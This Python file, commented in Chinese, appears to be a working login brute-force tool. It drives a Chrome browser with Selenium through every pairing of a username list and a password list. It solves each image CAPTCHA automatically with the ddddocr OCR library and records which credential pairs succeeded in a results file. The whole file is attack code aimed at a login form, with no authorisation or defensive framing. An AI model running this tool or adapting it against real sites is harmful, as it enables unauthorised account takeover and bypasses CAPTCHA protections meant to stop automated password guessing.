import base64
import itertools
import random
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import ddddocr
import time
import tkinter as tk  # 导入 tkinter 用于日志输出

chrome_options = Options()
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--log-level=3")
#chrome_options.add_argument("--headless")

ocr = ddddocr.DdddOcr()

def process_captcha(img_src):
    base64_data = img_src.replace('data:image/jpg;base64,', '')
    image_data = base64.b64decode(base64_data)
    captcha_text = ocr.classification(image_data)
    return captcha_text

def load_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def test_login(driver, url, username, password, captcha_selector, login_xpath, log_text_widget):
    driver.get(url)
    driver.implicitly_wait(10)

    # 输出尝试的用户名和密码
    log_text_widget.insert(tk.END, f"尝试用户名: {username}, 密码: {password} ... ")

    username_input = driver.find_element(By.ID, 'username')
    username_input.clear()
    username_input.send_keys(username)

    password_input = driver.find_element(By.ID, 'password')
    password_input.clear()
    password_input.send_keys(password)

    while True:
        img_element = driver.find_element(By.CSS_SELECTOR, captcha_selector)
        img_src = img_element.get_attribute("src")
        captcha_text = process_captcha(img_src)

        captcha_input = driver.find_element(By.ID, 'inputCode')
        captcha_input.clear()
        captcha_input.send_keys(captcha_text)

        login_button = driver.find_element(By.XPATH, login_xpath)
        login_button.click()

        time.sleep(2)

        if driver.current_url != url:
            log_text_widget.insert(tk.END, "登录成功!\n")
            log_text_widget.see(tk.END)
            return (username, password, True)
        else:
            log_text_widget.insert(tk.END, "登录失败!\n")
            log_text_widget.see(tk.END)
            return (username, password, False)

def main(url, captcha_selector, login_xpath, username_file, password_file, log_text_widget):
    usernames = load_list(username_file)
    passwords = load_list(password_file)
    combinations = list(itertools.product(usernames, passwords))
    random.shuffle(combinations)
    total_combinations = len(combinations)
    results = []

    num_browsers = 1
    drivers = [webdriver.Chrome(options=chrome_options) for _ in range(num_browsers)]

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_browsers) as executor:
            future_to_combination = {executor.submit(test_login, drivers[i % num_browsers], url, username, password, captcha_selector, login_xpath, log_text_widget): (username, password) for i, (username, password) in enumerate(combinations)}
            for i, future in enumerate(concurrent.futures.as_completed(future_to_combination)):
                username, password = future_to_combination[future]
                try:
                    result = future.result()
                    results.append(result)
                    log_text_widget.insert(tk.END, f"已测试第 {i + 1} 个组合/共 {total_combinations} 个组合\n")
                    log_text_widget.see(tk.END)
                except Exception as exc:
                    log_text_widget.insert(tk.END, f"账户: {username}, 密码: {password} 产生异常: {exc}\n")
                    log_text_widget.see(tk.END)
    finally:
        for driver in drivers:
            driver.quit()

    with open('login_results.txt', 'w') as file:
        for username, password, success in results:
            file.write(f"{username} / {password}: {'成功!!!!!!!' if success else '失败'}\n")
